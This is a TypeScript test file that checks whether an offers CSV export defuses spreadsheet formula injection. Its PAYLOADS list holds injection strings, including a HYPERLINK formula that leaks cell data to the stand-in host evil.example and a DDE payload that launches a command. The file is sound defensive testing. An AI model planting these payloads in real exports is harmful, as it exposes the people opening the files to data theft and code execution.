import { describe, expect, it } from 'vitest';
import { offersCsv } from '../server/csv.js';
import type { OfferRow } from '../shared/types.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

function offer(overrides: Partial<OfferRow> = {}): OfferRow {
  return {
    id: 1,
    number: 'ANG-2026-0001',
    customer_id: 1,
    customer_name: 'Beispiel GmbH',
    title: 'Website relaunch',
    status: 'draft',
    valid_until: '2026-09-01',
    expired: false,
    sent_at: null,
    net_cents: 100_000,
    vat_cents: 19_000,
    gross_cents: 119_000,
    supersedes_id: null,
    superseded_by_id: null,
    created_at: '2026-07-20T09:00:00Z',
    ...overrides,
  } as OfferRow;
}

describe('offers CSV export neutralizes spreadsheet formulas', () => {
  it.each(PAYLOADS)('defuses %o in the offer title', (payload) => {
    expectDefused(offersCsv([offer({ title: payload })]), payload);
  });

  it.each(PAYLOADS)('defuses %o in the customer name', (payload) => {
    expectDefused(offersCsv([offer({ customer_name: payload })]), payload);
  });

  it('leaves ordinary values and credit (negative) amounts alone', () => {
    const cells = cellsOf(offersCsv([offer({ title: 'Relaunch, "phase 2"', net_cents: -1_000 })]));
    expect(cells).toContain('Relaunch, "phase 2"');
    expect(cells).toContain('-1000');
    expect(cells).not.toContain("'-1000");
  });
});
